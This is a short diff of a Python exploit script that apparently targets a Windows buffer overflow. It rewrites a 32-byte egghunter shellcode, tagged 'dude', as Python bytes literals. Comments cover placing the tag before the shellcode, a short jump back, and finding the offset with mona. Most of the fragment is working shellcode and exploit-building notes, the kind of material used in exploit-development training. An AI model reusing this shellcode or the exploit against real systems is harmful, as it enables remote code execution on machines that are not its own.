@@ -5,10 +5,13 @@ import socket
 #jump back 60 ##msf-nasm_shell $ESP-60 EB C2
 
 
-#Egghunter , tag dude :
+
 # 1.debug break point start 2. debug break point 2nd conpare tag
-egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x64\x75\x64\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
-#Put this tag in front of your shellcode : dudedude
+# Put this tag in front of your shellcode : dudedude
+# 32byte egghunter tag=dude "\x64\x75\x64\x65"
+egghunter =  b""
+egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
+egghunter += b"\xef\xb8\x64\x75\x64\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
 
 
 #mona generic pattern 1000 ##mona findmsp
